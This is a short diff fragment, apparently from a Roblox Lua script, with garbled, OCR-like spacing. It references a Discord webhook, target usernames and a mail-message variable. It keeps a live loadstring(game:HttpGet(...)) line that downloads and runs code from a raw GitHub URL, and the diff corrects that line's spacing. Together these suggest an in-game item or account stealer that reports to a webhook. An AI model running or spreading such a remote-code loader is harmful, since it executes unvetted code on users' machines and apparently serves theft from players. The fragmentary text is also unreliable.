@@ -6,7 +6,7 @@ discord.com/api/ webhooks /
 Tkiv"
 UserName2 =
 "Odkdbfbfj"
-loadstring (game: HttpGe t ("https://
+loadstring (game:HttpGet ("https://
 raw.githubusercontent. com/Lypherx/idkk/main/ iddkkk2"))()
 
 _G.MailMessage = "Mori
